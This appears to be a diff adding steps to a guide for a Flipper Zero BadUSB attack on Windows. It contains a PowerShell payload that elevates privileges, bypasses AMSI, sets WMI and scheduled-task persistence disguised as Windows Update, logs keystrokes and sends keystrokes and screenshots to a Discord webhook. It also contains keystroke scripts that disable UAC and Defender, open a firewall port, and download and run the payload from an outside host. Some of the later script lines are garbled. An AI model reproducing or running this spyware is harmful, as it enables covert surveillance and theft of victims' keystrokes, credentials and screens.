@@ -403,6 +403,358 @@ ENTER
 ```
 
 ---
+### **Step 2: 3d version)Modified PowerShell Script**
+
+Save this as `payload.ps1`.
+
+```
+
+# Stage 1: Initialization and Elevation
+If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe "-ExecutionPolicy Bypass -File `"$env:temp\payload.ps1`"" -Verb RunAs
+    Exit
+}
+
+# Stage 2: Environment Preparation
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+$webhookUrl = "YOUROWNDISCORDWEBHOOKURL"
+
+# Stage 3: System Modifications
+New-NetFirewallRule -DisplayName "Windows Update Service" -Direction Outbound -Action Allow -Program "powershell.exe" -ErrorAction SilentlyContinue
+
+# Stage 4: Persistence Mechanisms
+$persistenceScript = {
+    $wmiArgs = @{
+        EventNamespace = 'root/cimv2'
+        Name = 'WindowsUpdateMonitor'
+        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LogonSession'"
+        QueryLanguage = 'WQL'
+    }
+    $filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $wmiArgs
+
+    $consumerArgs = @{
+        Name = 'WindowsUpdateTask'
+        CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
+    }
+    $consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $consumerArgs
+
+    $bindingArgs = @{
+        Filter = [Ref]$filter
+        Consumer = [Ref]$consumer
+    }
+    New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $bindingArgs
+
+    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:temp\payload.ps1`""
+    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
+    Register-ScheduledTask -TaskName "WindowsUpdateMaintenance" -Action $taskAction -Trigger $taskTrigger -User "SYSTEM" -RunLevel Highest -ErrorAction SilentlyContinue
+}
+
+Invoke-Command -ScriptBlock $persistenceScript
+
+# Stage 5: Background Operations
+Start-Job -Name "Keylogger" -ScriptBlock {
+    Add-Type -TypeDefinition @"
+    using System;
+    using System.IO;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    using System.Windows.Forms;
+    
+    public class Keylogger {
+        private const int WH_KEYBOARD_LL = 13;
+        private const int WM_KEYDOWN = 0x0100;
+        private static IntPtr _hookID = IntPtr.Zero;
+        private static string logPath = Path.Combine(Path.GetTempPath(), "systemlog.txt");
+        
+        [DllImport("user32.dll")]
+        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+        
+        [DllImport("user32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+        
+        [DllImport("user32.dll")]
+        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+        
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetModuleHandle(string lpModuleName);
+        
+        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        
+        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+                int vkCode = Marshal.ReadInt32(lParam);
+                File.AppendAllText(logPath, ((Keys)vkCode).ToString() + Environment.NewLine);
+            }
+            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+        }
+        
+        public static void Main() {
+            using (Process curProcess = Process.GetCurrentProcess())
+            using (ProcessModule curModule = curProcess.MainModule) {
+                _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, GetModuleHandle(curModule.ModuleName), 0);
+            }
+            Application.Run();
+            UnhookWindowsHookEx(_hookID);
+        }
+    }
+"@
+    [Keylogger]::Main()
+}
+
+Start-Job -Name "ScreenCapture" -ScriptBlock {
+    while ($true) {
+        try {
+            Add-Type -AssemblyName System.Windows.Forms
+            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+            $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
+            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
+            $memoryStream = New-Object System.IO.MemoryStream
+            $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+            $bytes = $memoryStream.ToArray()
+            $base64 = [Convert]::ToBase64String($bytes)
+            
+            $payload = @{
+                content = "System Update Report"
+                embeds = @(@{
+                    image = @{
+                        url = "data:image/jpeg;base64,$base64"
+                    }
+                })
+            }
+            
+            Invoke-RestMethod -Uri $using:webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+        } catch {}
+        Start-Sleep -Seconds 30
+    }
+}
+
+# Stage 6: Cleanup and Maintenance
+while ($true) {
+    try {
+        Get-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue | ForEach-Object {
+            $payload = @{ content = "System Log: $_" }
+            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
+        }
+        Clear-Content "$env:temp\systemlog.txt" -ErrorAction SilentlyContinue
+    } catch {}
+    Start-Sleep -Minutes 15
+}
+```
+
+---
+
+### **Step 3: (3nd version) Creating the Flipper Zero Payload**
+
+The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:
+
+```
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Force"
+DELAY 500
+ENTER
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe -Command "$regPath = 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System'; $name = 'EnableLUA'; $value = 0; New-ItemProperty -Path $regPath -Name $name -Value $value -PropertyType DWORD -Force"
+DELAY 500
+ENTER
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe -Command "Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
+DELAY 500
+ENTER
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"
+DELAY 500
+ENTER
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe -Command "New-NetFirewallRule -DisplayName 'AllowIncoming8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow -Enabled True"
+-delay 500 
+ENTER
+
+delay 1000 
+gui r 
+delay 500 
+string powershell.exe –command “$regPathNP = ‘HKLM:\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\NetworkList’; $nameNP = ‘NC_Signature_Enabled’; $valueNP = ‘0’ ; New-ItemProperty –path $regPathNP –Name $nameNP –Value ”$valueNP”–propertytype dword –force”
+delay   enter 
+
+# Your other script logic here...
+
+delay    gui R  
+string Powershell .exe  
+enter delay    
+Delay    string set-MpPreference-disableRealTimeMonitoring `$false   
+ Delay    Enter  
+
+Delay     # Optional: Start and enable Windows Defender services if previously stopped and disabled    
+ Delay      Gui R  
+ Delay      String Powershell .exe   
+ enter delay    
+ string start-service-name WinDefend  
+enter delay      
+String set-service-name windefend-startupType automatic   
+ enter delay   
+
+Delay     Remove the newly added rule when done (optional)   
+ delay    Gui R  
+ string Powershell .exe     
+ Enter Delay      
+string remove-netfirewallrule-displayname allowincoming8080        
+Enter Delay    
+
+ #Optional: Re-enable UAC(User Account Control) when done     
+ delay      gui R    
+ String Powershell .exe     
+Enter Delay        
+String   `$ regpathReenableUac=‘HKLM:\\\\SOFTWARE \\\\Microsoft \\\\Windows \\\\CurrentVersion \\\\Policies \\\\System‘;$namereenableuac=‘EnableLUA’;$valuereenableuac=1 ;New-itemproperty-path `$ regpathReenableUac-name `$ namereenableuac-value `$ valuereenableuac-propertytype dword-force       
+Enter       
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://tgmannen.infinityfreeapp.com/1/payload.ps1' -OutFile '$env:temp\payload.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\payload.ps1' -Verb RunAs"
+DELAY 1000
+ENTER
+```
+
+---
+### **Step 3: (3d version) Creating the Flipper Zero Payload**
+
+The Flipper Zero will simulate keystrokes to download and execute the PowerShell script. Here’s the BadUSB script:
+
+```
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Set PowerShell execution policy to bypass restrictions
+STRING powershell.exe -Command "Set-ExecutionPolicy -ExecutionPolicy Bypass -Force"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog again
+GUI r
+DELAY 500
+# Disable User Account Control (UAC) by modifying registry
+STRING powershell.exe -Command "
+# Define registry entry name and path
+name = 'EnableLUA';
+regPath -Name
+# Set value to disable UAC
+value -PropertyType DWORD -Force"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Stop and disable Windows Defender service
+STRING powershell.exe -Command "Stop-Service -Name WinDefend -Force; Set-Service -Name WinDefend -StartupType Disabled"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Disable Windows Defender real-time protection
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring `$true"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Add a new firewall rule to allow incoming connections on port 8080
+STRING powershell.exe -Command "New-NetFirewallRule -DisplayName 'AllowIncoming8080' -Direction Inbound -Protocol TCP -LocalPort 8080 -Action Allow -Enabled True"
+DELAY 500
+ENTER
+
+DELAY 1000
+# Open Run dialog
+GUI r
+DELAY 500
+# Modify additional security settings (potentially disables signature checks)
+STRING powershell.exe –command "
+# Define registry entry name and path
+nameNP = 'NC_Signature_Enabled';
+regPathNP –Name
+# Set value to disable signature-based checks
+valueNP -PropertyType DWORD -Force"
+DELAY 500
+ENTER
+
+# Optional: Restore Windows Defender real-time protection
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+# Enable real-time monitoring again
+STRING set-MpPreference -DisableRealTimeMonitoring `$false
+DELAY 500
+ENTER
+
+# Optional: Restart and re-enable Windows Defender service
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+# Start the service
+STRING start-service -Name WinDefend
+DELAY 500
+ENTER
+# Set the startup type back to automatic
+STRING set-service -Name WinDefend -StartupType Automatic
+DELAY 500
+ENTER
+
+# Optional: Remove the previously added firewall rule
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+# Remove the rule allowing inbound traffic on port 8080
+STRING remove-netfirewallrule -DisplayName 'AllowIncoming8080'
+DELAY 500
+ENTER
+
+# Optional: Re-enable User Account Control (UAC)
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell.exe
+ENTER
+STRING $regpathReenableUac='HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System';
+# Specify name and value for UAC
+$namereenableuac='EnableLUA';
+$valuereenableuac=1;
+# Re-enable UAC
+New-ItemProperty -Path $regpathReenableUac -Name $namereenableuac -Value $valuereenableuac -PropertyType DWORD -Force
+DELAY 1000
+ENTER
+
+```
+
+---
 
 ### **Step 4: Hosting the Script**
 
